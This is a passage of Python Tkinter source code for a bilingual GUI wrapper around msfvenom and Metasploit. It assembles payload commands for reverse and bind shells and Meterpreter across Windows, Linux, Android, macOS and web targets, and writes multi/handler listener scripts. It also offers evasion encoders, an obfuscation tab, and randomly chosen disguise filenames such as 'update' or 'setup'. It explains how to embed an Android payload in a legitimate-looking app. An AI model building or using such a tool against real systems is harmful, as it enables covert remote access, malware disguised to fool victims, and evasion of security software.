        tk.Entry(extra_card, textvariable=self.custom_opts_var, width=40,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=row, column=1, sticky="w", padx=10)
        
        tk.Button(extra_card, text="?", width=2, 
                 command=lambda: show_help("Custom Options", 
                                          "Opciones adicionales de msfvenom:\n\nEjemplos:\n-k: Preservar comportamiento de plantilla\n--smallest: Generar payload más pequeño posible\n-e <encoder>: Sintaxis alternativa de encoder\n--platform <platform>: Forzar plataforma\n--arch <arch>: Forzar arquitectura\n\nSeparar múltiples opciones con espacios",
                                          self.root),
                 bg=self.colors['primary'], fg="white").grid(row=row, column=2, padx=5)

    def build_obf_tab(self, parent):
        # Contenedor principal con grid
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        container.rowconfigure(1, weight=1)  # Fila del notebook se expande
        container.columnconfigure(0, weight=1)
        
        # Warning frame - NO se expande
        warning_frame = tk.Frame(container, bg=self.colors['warning'], height=30)
        warning_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        warning_frame.columnconfigure(0, weight=1)
        
        self.obf_warning_label = tk.Label(warning_frame, text="", 
                                         bg=self.colors['warning'], fg="black",
                                         font=("Helvetica", 9, "bold"))
        self.obf_warning_label.grid(row=0, column=0, pady=5)
        
        # Notebook para técnicas de ofuscación - se expande completamente
        obf_nb = ttk.Notebook(container)
        obf_nb.grid(row=1, column=0, sticky="nsew")
        
        # Tab 1: General techniques
        tab1 = tk.Frame(obf_nb, bg=self.colors['background'])
        tab1.rowconfigure(0, weight=1)
        tab1.columnconfigure(0, weight=1)
        
        # Tab 2: Platform-specific
        tab2 = tk.Frame(obf_nb, bg=self.colors['background'])
        tab2.rowconfigure(0, weight=1)
        tab2.columnconfigure(0, weight=1)
        
        # Tab 3: Advanced techniques
        tab3 = tk.Frame(obf_nb, bg=self.colors['background'])
        tab3.rowconfigure(0, weight=1)
        tab3.columnconfigure(0, weight=1)
        
        obf_nb.add(tab1, text="Generales")
        obf_nb.add(tab2, text="Windows")
        obf_nb.add(tab3, text="Avanzadas")
        
        # Contenido con scrollbar para cada tab
        for tab, content_key in [(tab1, 'obf_general'), (tab2, 'obf_windows'), (tab3, 'obf_advanced')]:
            # Canvas con scrollbar
            canvas = tk.Canvas(tab, bg=self.colors['background'], highlightthickness=0)
            scrollbar = ttk.Scrollbar(tab, orient="vertical", command=canvas.yview)
            
            scrollable_frame = tk.Frame(canvas, bg=self.colors['background'])
            scrollable_frame.bind(
                "<Configure>",
                lambda e, c=canvas: c.configure(scrollregion=c.bbox("all"))
            )
            
            canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
            canvas.configure(yscrollcommand=scrollbar.set)
            
            canvas.grid(row=0, column=0, sticky="nsew")
            scrollbar.grid(row=0, column=1, sticky="ns")
            
            tab.columnconfigure(0, weight=1)
            tab.rowconfigure(0, weight=1)
            
            content = scrolledtext.ScrolledText(scrollable_frame, font=("Consolas", 10), 
                                                bg="#0b1220", fg="#e5e7eb")
            content.pack(fill="both", expand=True, padx=10, pady=10)
            content.insert("1.0", self.translator.t(content_key))
            content.configure(state="disabled")
        
        # Actualizar la advertencia después de crear el widget
        self.update_obfuscation_warning()

    def build_extra_tab(self, parent):
        # Contenedor principal con grid
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        container.rowconfigure(0, weight=1)
        container.columnconfigure(0, weight=1)
        
        # Notebook para payloads adicionales - se expande completamente
        extra_nb = ttk.Notebook(container)
        extra_nb.grid(row=0, column=0, sticky="nsew")
        
        # Windows payloads
        win_tab = tk.Frame(extra_nb, bg=self.colors['background'])
        win_tab.rowconfigure(0, weight=1)
        win_tab.columnconfigure(0, weight=1)
        
        # Linux payloads
        linux_tab = tk.Frame(extra_nb, bg=self.colors['background'])
        linux_tab.rowconfigure(0, weight=1)
        linux_tab.columnconfigure(0, weight=1)
        
        # Web payloads
        web_tab = tk.Frame(extra_nb, bg=self.colors['background'])
        web_tab.rowconfigure(0, weight=1)
        web_tab.columnconfigure(0, weight=1)
        
        extra_nb.add(win_tab, text="Windows")
        extra_nb.add(linux_tab, text="Linux")
        extra_nb.add(web_tab, text="Web")
        
        # Contenido con scrollbar para cada tab
        for tab, content_key in [(win_tab, 'win_payloads'), (linux_tab, 'linux_payloads'), (web_tab, 'web_payloads')]:
            # Canvas con scrollbar
            canvas = tk.Canvas(tab, bg=self.colors['background'], highlightthickness=0)
            scrollbar = ttk.Scrollbar(tab, orient="vertical", command=canvas.yview)
            
            scrollable_frame = tk.Frame(canvas, bg=self.colors['background'])
            scrollable_frame.bind(
                "<Configure>",
                lambda e, c=canvas: c.configure(scrollregion=c.bbox("all"))
            )
            
            canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
            canvas.configure(yscrollcommand=scrollbar.set)
            
            canvas.grid(row=0, column=0, sticky="nsew")
            scrollbar.grid(row=0, column=1, sticky="ns")
            
            tab.columnconfigure(0, weight=1)
            tab.rowconfigure(0, weight=1)
            
            content = scrolledtext.ScrolledText(scrollable_frame, font=("Consolas", 9), 
                                                bg="#0b1220", fg="#e5e7eb")
            content.pack(fill="both", expand=True, padx=10, pady=10)
            content.insert("1.0", self.translator.t(content_key))
            content.configure(state="disabled")

    def build_generate_tab(self, parent):
        # Contenedor principal con grid
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        container.rowconfigure(1, weight=1)  # Fila del output se expande
        container.columnconfigure(0, weight=1)
        
        # Top buttons - NO se expanden
        button_frame = tk.Frame(container, bg=self.colors['background'])
        button_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        tk.Button(button_frame, text=self.translator.t('generate'), 
                 command=self.generate_all, bg=self.colors['success'], 
                 fg="white", font=("Helvetica", 12, "bold"), 
                 padx=30, pady=12).grid(row=0, column=0, padx=5)
        
        tk.Button(button_frame, text=self.translator.t('copy_command'), 
                 command=self.copy_command, bg=self.colors['primary'], 
                 fg="white", font=("Helvetica", 10), 
                 padx=20, pady=8).grid(row=0, column=1, padx=5)
        
        tk.Button(button_frame, text=self.translator.t('clear_output'), 
                 command=self.clear_output, bg=self.colors['warning'], 
                 fg="white", font=("Helvetica", 10), 
                 padx=20, pady=8).grid(row=0, column=2, padx=5)
        
        tk.Button(button_frame, text=self.translator.t('show_handler'), 
                 command=self.show_handler_content, bg=self.colors['primary_soft'], 
                 fg="white", font=("Helvetica", 10), 
                 padx=20, pady=8).grid(row=0, column=3, padx=5)
        
        # Output area - se expande completamente
        output_card = tk.LabelFrame(container, text=self.translator.t('generation_output'), 
                                   bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                                   font=("Helvetica", 11, "bold"), padx=15, pady=15)
        output_card.grid(row=1, column=0, sticky="nsew")
        output_card.rowconfigure(0, weight=1)
        output_card.columnconfigure(0, weight=1)
        
        self.output = scrolledtext.ScrolledText(output_card, height=20,
                                               font=("Consolas", 10), 
                                               bg="#0b1220", fg="#e5e7eb")
        self.output.grid(row=0, column=0, sticky="nsew")
        
        # Bottom status - NO se expande
        self.generation_status = tk.Label(container, text="", 
                                         bg=self.colors['background'], 
                                         fg=self.colors['text_muted'],
                                         font=("Helvetica", 9))
        self.generation_status.grid(row=2, column=0, sticky="w", pady=(5, 0))

    def update_encoder_examples(self):
        """Update encoder examples based on selected architecture"""
        # Verificar que los widgets existen antes de acceder a ellos
        if not hasattr(self, 'encoder_examples_frame'):
            return
        
        # Clean frame
        for widget in self.encoder_examples_frame.winfo_children():
            widget.destroy()
        
        platform = self.platform_var.get()
        
        # For Android, disable encoders completely
        if platform == "android":
            self.encoder_var.set("none")
            if hasattr(self, 'encoder_entry'):
                self.encoder_entry.config(state="disabled", fg=self.colors['disabled'])
            if hasattr(self, 'iterations_entry'):
                self.iterations_entry.config(state="disabled", fg=self.colors['disabled'])
            return
        else:
            if hasattr(self, 'encoder_entry'):
                self.encoder_entry.config(state="normal", fg=self.colors['text'])
            if hasattr(self, 'iterations_entry'):
                self.iterations_entry.config(state="normal", fg=self.colors['text'])
        
        arch = self.arch_var.get()
        
        # Map x86_64 to x64
        if arch == "x86_64":
            arch = "x64"
        
        # Compatible encoders by architecture - ONLY RELIABLE ENCODERS
        encoders_by_arch = {
            "x86": ["x86/shikata_ga_nai", "x86/alpha_mixed", "x86/unicode_mixed", "x86/countdown"],
            "x64": ["x64/xor", "x64/xor_dynamic", "cmd/powershell_base64"],  # Removed x64/zutto_dekiru due to issues
        }
        
        # Get encoders for this architecture
        encoders = encoders_by_arch.get(arch, ["x86/shikata_ga_nai", "cmd/powershell_base64"])
        
        # Add "none" as option
        encoders.append("none")
        
        for i, enc in enumerate(encoders):
            tk.Button(self.encoder_examples_frame, text=enc, 
                     command=lambda e=enc: self.encoder_var.set(e),
                     bg=self.colors['primary_soft'], fg=self.colors['text'],
                     font=("Helvetica", 8), padx=5).grid(row=0, column=i, padx=2)

    def update_obfuscation_warning(self):
        """Update warning in obfuscation tab"""
        if not hasattr(self, 'obf_warning_label'):
            return
            
        arch = self.arch_var.get()
        
        if arch in ["x64", "x86_64"]:
            self.obf_warning_label.config(
                text=self.translator.t('x64_obfuscation_warning')
            )
        elif arch == "x86":
            self.obf_warning_label.config(
                text=self.translator.t('x86_obfuscation_warning')
            )
        else:
            self.obf_warning_label.config(text="")

    def update_formats(self):
        """Update available formats based on selected platform"""
        # Verificar que el frame existe
        if not hasattr(self, 'format_frame'):
            return
            
        # Clean frame
        for widget in self.format_frame.winfo_children():
            widget.destroy()
        
        platform = self.platform_var.get()
        
        # Define formats by platform
        formats_by_platform = {
            "windows": [
                ("EXE", "exe"), ("DLL", "dll"), ("PS1", "psh"), 
                ("VBS", "vbs"), ("RAW", "raw"), ("C", "c")
            ],
            "linux": [
                ("ELF", "elf"), ("SO", "so"), ("RAW", "raw"), 
                ("C", "c"), ("PY", "py")
            ],
            "android": [
                ("RAW", "raw")  # Android solo permite raw
            ],
            "osx": [
                ("MACHO", "macho"), ("RAW", "raw"), ("C", "c")
            ],
            "web": [
                ("PHP", "php"), ("ASP", "asp"), ("JSP", "jsp"),
                ("WAR", "war"), ("RAW", "raw")
            ],
            "multi": [
                ("JAR", "jar"), ("RAW", "raw"), ("C", "c"),
                ("PY", "py"), ("PS1", "psh")
            ]
        }
        
        # Get formats for this platform
        formats = formats_by_platform.get(platform, [("RAW", "raw")])
        
        # Create radio buttons for each format
        for i, (name, value) in enumerate(formats):
            rb = tk.Radiobutton(self.format_frame, text=name, value=value, 
                              variable=self.format_var, bg=self.colors['card_bg'], 
                              fg=self.colors['text'], selectcolor=self.colors['primary_soft'],
                              font=("Helvetica", 9))
            # Use grid for better organization
            row = i // 3
            col = i % 3
            rb.grid(row=row, column=col, sticky="w", padx=5, pady=2)
            
            # Save reference
            self.format_buttons[value] = rb
            
            # For Android, force raw format and disable other options
            if platform == "android" and value != "raw":
                rb.config(state="disabled", fg=self.colors['disabled'])
            
            # For web formats, add warnings
            if platform == "web" and value in ["war", "jar"]:
                rb.config(fg=self.colors['warning'])
            
            # Select first format by default
            if i == 0:
                self.format_var.set(value)

    def on_platform_change(self):
        """Handler for platform change"""
        platform = self.platform_var.get()
        
        # Special handling for Android
        if platform == "android":
            # Force raw format for Android
            self.format_var.set("raw")
            # Clear encoder for Android
            self.encoder_var.set("none")
            # Hide architecture selection for Android
            self.arch_label.grid_remove()
            self.arch_frame.grid_remove()
            
            # Show Android warning
            if hasattr(self, 'android_warning_label'):
                self.android_warning_label.config(
                    text=self.translator.t('android_raw_warning')
                )
            
            # Update encoder warning with Android-specific message
            if hasattr(self, 'encoder_warning_label'):
                self.encoder_warning_label.config(
                    text="⚠ Android: Solo formato RAW. No se permiten encoders." 
                    if self.translator.language == 'es' else 
                    "⚠ Android: RAW format only. No encoders allowed."
                )
        else:
            # Show architecture selection for non-Android platforms
            if hasattr(self, 'arch_label'):
                self.arch_label.grid()
            if hasattr(self, 'arch_frame'):
                self.arch_frame.grid()
            
            # Hide Android warning
            if hasattr(self, 'android_warning_label'):
                self.android_warning_label.config(text="")
            
            # Reset encoder warning for other platforms
            if hasattr(self, 'encoder_warning_label'):
                self.encoder_warning_label.config(text=self.translator.t('encoder_warning'))
        
        self.update_payloads()
        self.update_formats()
        self.update_encoder_examples()
        self.update_preview()

    def on_architecture_change(self):
        """Handler for architecture change"""
        self.update_payloads()
        self.update_encoder_examples()
        self.update_obfuscation_warning()
        self.update_preview()

    def update_payloads(self):
        # Verificar que el frame existe
        if not hasattr(self, 'payload_frame'):
            return
            
        # Clear current payloads
        for widget in self.payload_frame.winfo_children():
            widget.destroy()
        
        platform = self.platform_var.get()
        arch_ui = self.arch_var.get()
        
        # Architecture mapping UI -> Metasploit
        arch_map = {
            "x86": "x86",
            "x64": "x64",
            "x86_64": "x64"  # Metasploit doesn't use x86_64, only x64
        }
        
        # Payloads table - WITH COMPLETE AND CORRECT PATHS
        payloads_db = {
            "windows": [
                # x86 payloads
                ("Meterpreter Reverse TCP (x86)", "windows/meterpreter/reverse_tcp"),
                ("Meterpreter Reverse HTTPS (x86)", "windows/meterpreter/reverse_https"),
                ("Meterpreter Reverse HTTP (x86)", "windows/meterpreter/reverse_http"),
                ("Shell Reverse TCP (x86)", "windows/shell_reverse_tcp"),
                ("Meterpreter Bind TCP (x86)", "windows/meterpreter/bind_tcp"),
                ("Shell Bind TCP (x86)", "windows/shell_bind_tcp"),
                ("Meterpreter Reverse WinHTTP (x86)", "windows/meterpreter/reverse_winhttp"),
                
                # x64 payloads
                ("Meterpreter Reverse TCP (x64)", "windows/x64/meterpreter/reverse_tcp"),
                ("Meterpreter Reverse HTTPS (x64)", "windows/x64/meterpreter/reverse_https"),
                ("Meterpreter Reverse HTTP (x64)", "windows/x64/meterpreter/reverse_http"),
                ("Shell Reverse TCP (x64)", "windows/x64/shell_reverse_tcp"),
                ("Meterpreter Bind TCP (x64)", "windows/x64/meterpreter/bind_tcp"),
                ("Shell Bind TCP (x64)", "windows/x64/shell_bind_tcp"),
                ("DLL Inject Reverse TCP (x64)", "windows/x64/dllinject/reverse_tcp"),
            ],
            
            "linux": [
                # x86 payloads
                ("Meterpreter Reverse TCP (x86)", "linux/x86/meterpreter/reverse_tcp"),
                ("Shell Reverse TCP (x86)", "linux/x86/shell_reverse_tcp"),
                ("Shell Bind TCP (x86)", "linux/x86/shell_bind_tcp"),
                ("Meterpreter Bind TCP (x86)", "linux/x86/meterpreter/bind_tcp"),
                ("Exec (x86)", "linux/x86/exec"),
                ("Chmod (x86)", "linux/x86/chmod"),
                
                # x64 payloads
                ("Meterpreter Reverse TCP (x64)", "linux/x64/meterpreter/reverse_tcp"),
                ("Shell Reverse TCP (x64)", "linux/x64/shell_reverse_tcp"),
                ("Shell Bind TCP (x64)", "linux/x64/shell_bind_tcp"),
                ("Meterpreter Bind TCP (x64)", "linux/x64/meterpreter/bind_tcp"),
                ("Exec (x64)", "linux/x64/exec"),
                
                # ARM payloads
                ("Shell Reverse TCP (ARM)", "linux/armle/shell_reverse_tcp"),
            ],
            
            "android": [
                # Android payloads - no architecture in path
                ("Meterpreter Reverse TCP", "android/meterpreter/reverse_tcp"),
                ("Shell Reverse TCP", "android/shell/reverse_tcp"),
                ("Meterpreter Reverse HTTP", "android/meterpreter/reverse_http"),
                ("Meterpreter Reverse HTTPS", "android/meterpreter/reverse_https"),
            ],
            
            "osx": [
                ("Shell Reverse TCP (x64)", "osx/x64/shell_reverse_tcp"),
                ("Meterpreter Reverse TCP (x64)", "osx/x64/meterpreter/reverse_tcp"),
                ("Shell Bind TCP (x64)", "osx/x64/shell_bind_tcp"),
                ("Meterpreter Bind TCP (x64)", "osx/x64/meterpreter/bind_tcp"),
            ],
            
            "web": [
                ("PHP Meterpreter", "php/meterpreter_reverse_tcp"),
                ("PHP Reverse Shell", "php/reverse_php"),
                ("PHP Bind Shell", "php/bind_php"),
                ("PHP Exec", "php/exec"),
                ("ASP Meterpreter", "asp/meterpreter_reverse_tcp"),
                ("ASP Shell Reverse", "asp/shell_reverse_tcp"),
                ("JSP Shell Reverse", "java/jsp_shell_reverse_tcp"),
                ("JSP Shell Bind", "java/jsp_shell_bind_tcp"),
                ("Python Reverse TCP", "python/shell_reverse_tcp"),
            ],
            
            "multi": [
                ("Java Meterpreter", "java/meterpreter/reverse_tcp"),
                ("Python Meterpreter", "python/meterpreter/reverse_tcp"),
                ("Perl Reverse Shell", "cmd/unix/reverse_perl"),
                ("Bash Reverse TCP", "cmd/unix/reverse_bash"),
            ]
        }
        
        # Map UI architecture to valid Metasploit architecture
        arch_metasploit = arch_map.get(arch_ui, arch_ui)
        
        # For Android, show all Android payloads (no architecture filtering)
        if platform == "android":
            valid_payloads = [(name, path) for name, path in payloads_db.get(platform, [])]
        # For web and multi, ignore UI architecture
        elif platform in ["web", "multi"]:
            # Show all payloads for that platform
            valid_payloads = [(name, path) for name, path in payloads_db.get(platform, [])]
        else:
            # Filter payloads that contain architecture in the path
            valid_payloads = []
            for name, path in payloads_db.get(platform, []):
                # Check if path contains architecture
                if f"/{arch_metasploit}/" in path or path.endswith(f"/{arch_metasploit}"):
                    valid_payloads.append((name, path))
                elif arch_metasploit == "x86" and "/x64/" not in path and not path.endswith("/x64"):
                    # For x86, include payloads that are not x64
                    if "/x64/" not in path and not path.endswith("/x64"):
                        valid_payloads.append((name, path))
        
        # If no valid payloads, show error
        if not valid_payloads and platform not in ["android", "web", "multi"]:
            error_msg = f"ERROR: No hay payloads para {platform}/{arch_ui}"
            label = tk.Label(self.payload_frame, text=error_msg,
                           bg=self.colors['card_bg'], fg=self.colors['danger'],
                           font=("Helvetica", 10, "bold"))
            label.pack(pady=20)
            
            # Auto-correct if possible
            if platform == "osx" and arch_ui != "x64":
                self.arch_var.set("x64")
                self.update_payloads()
            elif platform == "android" and arch_ui != "x86":
                self.arch_var.set("x86")
                self.update_payloads()
            return
        
        # Show payloads in UI
        for i, (name, value) in enumerate(valid_payloads):
            rb = tk.Radiobutton(self.payload_frame, text=name, value=value, 
                               variable=self.payload_var, bg=self.colors['card_bg'], 
                               fg=self.colors['text'], selectcolor=self.colors['primary_soft'],
                               font=("Helvetica", 9))
            rb.pack(anchor="w", pady=2)
            
            # Select first payload by default
            if i == 0:
                self.payload_var.set(value)

    def validate_ip(self, *_):
        ip = self.ip_var.get()
        if re.match(r"^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.)", ip):
            self.ip_warning_var.set(self.translator.t('ip_local'))
        elif ip in ["127.0.0.1", "localhost"]:
            self.ip_warning_var.set(self.translator.t('ip_localhost'))
        elif ip:
            self.ip_warning_var.set(self.translator.t('ip_public'))
        else:
            self.ip_warning_var.set("")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            self.ip_var.set(ip)
            s.close()
            messagebox.showinfo("IP Detectada" if self.translator.language == 'es' else "IP Detected", 
                              f"IP local detectada: {ip}" if self.translator.language == 'es' else f"Local IP detected: {ip}")
        except Exception as e:
            self.ip_var.set("127.0.0.1")
            messagebox.showwarning("Error" if self.translator.language == 'es' else "Error", 
                                 f"No se pudo detectar la IP: {str(e)}" if self.translator.language == 'es' else f"Could not detect IP: {str(e)}")

    def choose_dir(self):
        directory = filedialog.askdirectory()
        if directory:
            self.outdir_var.set(directory)
            self.update_status(f"Directorio seleccionado: {directory}" if self.translator.language == 'es' else f"Directory selected: {directory}")

    def generate_filename(self):
        import random
        prefixes = ["update", "backup", "setup", "install", "service", "system", "win", "data"]
        suffixes = ["", "_v1", "_v2", "_final", "_new", "_2024"]
        
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        timestamp = datetime.now().strftime("%Y%m%d")
        
        self.output_var.set(f"{prefix}{suffix}_{timestamp}")
        self.update_status(f"Nombre generado: {self.output_var.get()}" if self.translator.language == 'es' else f"Name generated: {self.output_var.get()}")

    def update_preview(self):
        try:
            cmd = self.build_payload_command("/tmp/preview")
            pretty = " ".join(shlex.quote(arg) for arg in cmd)
            
            self.preview_text.configure(state="normal")
            self.preview_text.delete("1.0", tk.END)
            self.preview_text.insert("1.0", pretty)
            self.preview_text.configure(state="disabled")
        except:
            pass

    def build_payload_command(self, outfile):
        # Base command:
        cmd = [
            "msfvenom",
            "-p", self.payload_var.get(),
            f"LHOST={self.ip_var.get()}",
            f"LPORT={self.port_var.get()}"
        ]

        # Output format - SPECIAL HANDLING FOR ANDROID
        platform = self.platform_var.get()
        if platform == "android":
            # FORCE raw format for Android
            cmd.extend(["-f", "raw"])
        else:
            cmd.extend(["-f", self.format_var.get()])

        # =========================
        # ENCODER (optional) - DISABLED FOR ANDROID
        # =========================
        encoder = self.encoder_var.get()
        if encoder and encoder.lower() != "none" and platform != "android":
            cmd.extend(["-e", encoder])

            # Iterations
            if self.iterations_var.get().isdigit() and int(self.iterations_var.get()) > 1:
                cmd.extend(["-i", self.iterations_var.get()])

        # =========================
        # BAD CHARS
        # =========================
        badchars = self.badchars_var.get().strip()
        if badchars and badchars != "\\x00":
            cmd.extend(["-b", badchars])

        # =========================
        # NOP SLED
        # =========================
        if self.nop_var.get().isdigit() and int(self.nop_var.get()) > 0:
            cmd.extend(["-n", self.nop_var.get()])

        # =========================
        # PREPEND / APPEND
        # =========================
        prepend = self.prepend_var.get().strip()
        if prepend:
            cmd.extend(["--prepend", prepend])

        append = self.append_var.get().strip()
        if append:
            cmd.extend(["--append", append])

        # =========================
        # CUSTOM OPTIONS
        # =========================
        custom = self.custom_opts_var.get().strip()
        if custom:
            cmd.extend(custom.split())

        # =========================
        # OUTPUT
        # =========================
        cmd.extend(["-o", outfile])

        return cmd

    def write_handler_rc(self, handler_path):
        # Get current payload
        payload = self.payload_var.get()
        
        # Clean and stable handler - WITHOUT problematic options
        if self.translator.language == 'es':
            content = f"""# Handler para Metasploit
# Generado automáticamente el {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Payload: {payload}

use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {self.ip_var.get()}
set LPORT {self.port_var.get()}
set ExitOnSession false

# NOTA: Este handler está optimizado para estabilidad
# No incluye AutoRunScript, StageEncoder u otras opciones problemáticas

run -j
"""
        else:
            content = f"""# Metasploit Handler
# Automatically generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Payload: {payload}

use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {self.ip_var.get()}
set LPORT {self.port_var.get()}
set ExitOnSession false

# NOTE: This handler is optimized for stability
# Does not include AutoRunScript, StageEncoder or other problematic options

run -j
"""
        
        with open(handler_path, "w", encoding="utf-8") as f:
            f.write(content)
        
        return content

    def validate_payload_config(self):
        """Comprehensive pre-flight validation"""
        errors = []
        warnings = []
        
        # Get current configuration
        platform = self.platform_var.get()
        payload = self.payload_var.get()
        fmt = self.format_var.get()
        arch = self.arch_var.get()
        encoder = self.encoder_var.get()
        lang = self.translator.language
        
        # ================================================
        # 1. VALIDATE PAYLOAD EXISTS
        # ================================================
        if not payload:
            errors.append(self.translator.t('payload_not_found').format(payload="(empty)"))
        elif not self.cache.is_valid_payload(payload):
            errors.append(self.translator.t('payload_not_found').format(payload=payload))
        
        # ================================================
        # 2. VALIDATE FORMAT EXISTS AND IS COMPATIBLE
        # ================================================
        if not self.cache.is_valid_format(fmt):
            errors.append(self.translator.t('format_not_found').format(format=fmt))
        elif not self.cache.is_platform_format_valid(platform, fmt):
            errors.append(self.translator.t('invalid_platform_format').format(
                format=fmt, platform=platform))
        
        # ================================================
        # 3. ANDROID-SPECIFIC VALIDATIONS
        # ================================================
        if platform == "android":
            # Android must use raw format
            if fmt != "raw":
                errors.append(self.translator.t('android_raw_warning'))
            
            # Android does not support encoders
            if encoder and encoder.lower() != "none":
                errors.append(self.translator.t('android_encoder_warning'))
        
        # ================================================
        # 4. ENCODER VALIDATION
        # ================================================
        if encoder and encoder.lower() != "none":
            # Check encoder architecture compatibility
            if "x86/" in encoder and arch not in ["x86", "x86_64"]:
                errors.append(self.translator.t('invalid_encoder_arch').format(
                    encoder=encoder, arch=arch))
            elif "x64/" in encoder and arch not in ["x64", "x86_64"]:
                errors.append(self.translator.t('invalid_encoder_arch').format(
                    encoder=encoder, arch=arch))
            
            # Block problematic encoders
            if "zutto_dekiru" in encoder:
                errors.append("El encoder 'zutto_dekiru' es inestable y puede causar errores.")
        
        # ================================================
        # 5. WEB-SPECIFIC VALIDATIONS
        # ================================================
        if platform == "web":
            # WAR format requires manual packaging
            if fmt == "war":
                warnings.append(self.translator.t('web_war_warning'))
            
            # JAR format only valid for Java payloads
            if fmt == "jar" and not payload.startswith("java/"):
                errors.append(self.translator.t('web_jar_warning'))
        
        # ================================================
        # 6. PLATFORM-FORMAT LOGICAL CONSISTENCY
        # ================================================
        # Example: PHP payload with EXE format
        if "php/" in payload and fmt in ["exe", "dll", "elf", "apk", "macho"]:
            errors.append(f"Payload PHP '{payload}' no puede generarse como '{fmt}'. Usa formato 'php' o 'raw'.")
        
        # Java payload with non-JAR format warning
        if payload.startswith("java/") and fmt != "jar":
            warnings.append(f"⚠ Payload Java '{payload}' normalmente se usa con formato 'jar'.")
        
        # ================================================
        # 7. ARCHITECTURE-PAYLOAD CONSISTENCY
        # ================================================
        if platform not in ["android", "web", "multi"]:
            # Check if payload architecture matches selected architecture
            if "/x64/" in payload and arch not in ["x64", "x86_64"]:
                errors.append(f"Payload x64 '{payload}' requiere arquitectura x64.")
            elif "/x86/" in payload and arch not in ["x86"]:
                errors.append(f"Payload x86 '{payload}' requiere arquitectura x86.")
        
        return errors, warnings

    def generate_all(self):
        # ====================================================================
        # VALIDACIÓN BÁSICA DE CAMPOS (Código Original Preservado)
        # ====================================================================
        if not self.payload_var.get():
            messagebox.showwarning("Falta Payload" if self.translator.language == 'es' else "Missing Payload", 
                                "Selecciona un tipo de payload" if self.translator.language == 'es' else "Please select a payload type")
            return
        
        if not self.ip_var.get():
            messagebox.showwarning("Falta LHOST" if self.translator.language == 'es' else "Missing LHOST", 
                                "Ingresa tu dirección IP" if self.translator.language == 'es' else "Please enter your IP address")
            return
        
        if not self.port_var.get() or not self.port_var.get().isdigit():
            messagebox.showwarning("LPORT Inválido" if self.translator.language == 'es' else "Invalid LPORT", 
                                "Ingresa un número de puerto válido" if self.translator.language == 'es' else "Please enter a valid port number")
            return
        
        if not self.output_var.get():
            messagebox.showwarning("Falta Nombre" if self.translator.language == 'es' else "Missing Filename", 
                                "Ingresa un nombre de archivo" if self.translator.language == 'es' else "Please enter an output filename")
            return

        # ====================================================================
        # [NUEVO] PRE-FLIGHT VALIDATION
        # ====================================================================
        self.output.delete("1.0", tk.END)
        self.output.insert("1.0", f"[{datetime.now().strftime('%H:%M:%S')}] {self.translator.t('preflight_check')}\n")
        self.output.insert("end", "-" * 80 + "\n")
        self.generation_status.config(text=self.translator.t('preflight_check'), fg=self.colors['warning'])
        self.root.update()
        
        errors, warnings = self.validate_payload_config()
        
        if errors:
            self.output.insert("end", f"\n{self.translator.t('preflight_failed')}\n")
            for error in errors:
                self.output.insert("end", f"• {error}\n")
            
            self.output.insert("end", "\n" + "="*80 + "\n")
            self.output.insert("end", "RECOMENDACIONES:\n")
            self.output.insert("end", "1. Revisa la configuración básica\n")
            self.output.insert("end", "2. Asegúrate de que el payload sea compatible con la plataforma\n")
            self.output.insert("end", "3. Verifica que el formato sea válido para el payload\n")
            self.output.insert("end", "4. Para Android, usa solo formato RAW\n")
            
            self.generation_status.config(text=self.translator.t('preflight_failed'), fg=self.colors['danger'])
            
            # Show error dialog
            error_msg = "\n".join(errors)
            if self.translator.language == 'es':
                messagebox.showerror("Validación Fallida", 
                                   f"Configuración inválida detectada:\n\n{error_msg}\n\n"
                                   "Por favor corrige los errores antes de generar.")
            else:
                messagebox.showerror("Validation Failed", 
                                   f"Invalid configuration detected:\n\n{error_msg}\n\n"
                                   "Please fix errors before generating.")
            return
        
        # Show warnings if any
        if warnings:
            self.output.insert("end", f"\n⚠ ADVERTENCIAS (puedes continuar):\n")
            for warning in warnings:
                self.output.insert("end", f"• {warning}\n")
        
        self.output.insert("end", f"\n {self.translator.t('preflight_success')}\n")
        self.output.insert("end", "-" * 80 + "\n\n")
        
        # Mensaje educativo para Android
        if self.platform_var.get() == "android" and not self.android_warning_shown:
            android_note = """
            ⚠ IMPORTANTE: Payload Android generado como RAW DATA

            Para obtener un APK instalable:
            1. Integra este payload en una aplicación Android legítima
            2. Compila usando Android Studio
            3. Firma con tu keystore
            4. El archivo .apk resultante será instalable

            NOTA: msfvenom NO genera APKs directamente.
                  Solo proporciona el shellcode en formato raw.
            """
            if self.translator.language == 'en':
                android_note = """
                ⚠ IMPORTANT: Android payload generated as RAW DATA

                To obtain an installable APK:
                1. Integrate this payload into a legitimate Android app
                2. Compile using Android Studio
                3. Sign with your keystore
                4. The resulting .apk file will be installable

                NOTE: msfvenom does NOT generate APKs directly.
                      It only provides shellcode in raw format.
                """
            
            self.android_warning_shown = True
            self.output.insert("end", android_note + "\n" + "="*80 + "\n\n")
        
        # Determine extension based on format
        format_extensions = {
            "exe": ".exe", "dll": ".dll", "psh": ".ps1", "vbs": ".vbs",
            "elf": "", "apk": ".apk", "raw": ".bin", "py": ".py", "c": ".c",
            "php": ".php", "asp": ".asp", "jsp": ".jsp", "war": ".war",
            "jar": ".jar", "macho": "", "so": ".so"
        }
        
        ext = format_extensions.get(self.format_var.get(), "")
        if not ext and self.format_var.get() in ["elf", "macho"]:
            ext = ""
        
        payload_filename = f"{self.output_var.get()}{ext}"
